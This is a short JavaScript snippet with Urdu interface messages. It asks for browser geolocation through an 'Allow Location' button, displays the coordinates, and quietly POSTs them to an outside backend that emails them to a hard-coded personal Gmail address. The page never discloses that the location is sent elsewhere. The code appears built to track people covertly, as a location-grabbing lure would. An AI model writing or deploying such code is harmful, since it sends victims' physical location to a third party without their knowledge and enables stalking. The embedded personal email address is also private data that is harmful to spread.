let latitude, longitude;

// Function to request location permission and get the coordinates
function requestLocation() {
    if ("geolocation" in navigator) {
        // Request the location
        navigator.geolocation.getCurrentPosition(
            (position) => {
                latitude = position.coords.latitude;
                longitude = position.coords.longitude;

                // Show the location on the page
                document.getElementById("locationDisplay").innerHTML = `
                    <strong>عرض بلد:</strong> ${latitude}<br>
                    <strong>طول بلد:</strong> ${longitude}
                `;

                // Send email with location data
                sendEmail("مقام کی رسائی", `عرض بلد: ${latitude}, طول بلد: ${longitude}`, "khalilrodeni@gmail.com");
            },
            (error) => {
                // Handle error: Unable to retrieve location
                if (error.code === error.PERMISSION_DENIED) {
                    alert("مقام کی رسائی کا اجازت نہیں ہے۔ براہ کرم اپنے براؤزر کی سیٹنگ میں مقام کی اجازت دیں۔");
                } else if (error.code === error.POSITION_UNAVAILABLE) {
                    alert("مقام دستیاب نہیں ہے، براہ کرم دوبارہ کوشش کریں.");
                } else {
                    alert("مقام کی رسائی میں خرابی، براہ کرم دوبارہ کوشش کریں.");
                }
            }
        );
    } else {
        alert("آپ کا براؤزر مقام کی اجازت نہیں دیتا.");
    }
}

// Function to send email
function sendEmail(subject, message, recipient) {
    const emailData = {
        subject: subject,
        message: message,
        recipient: recipient
    };

    fetch("https://zalex-backend.onrender.com/api/send-email/", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(emailData)
    })
    .then(response => response.json())
    .then(data => console.log("Email sent:", data))
    .catch(error => console.error("Error sending email:", error));
}

// Event listener for the "Allow Location" button
document.getElementById("allowLocationButton").addEventListener("click", requestLocation);
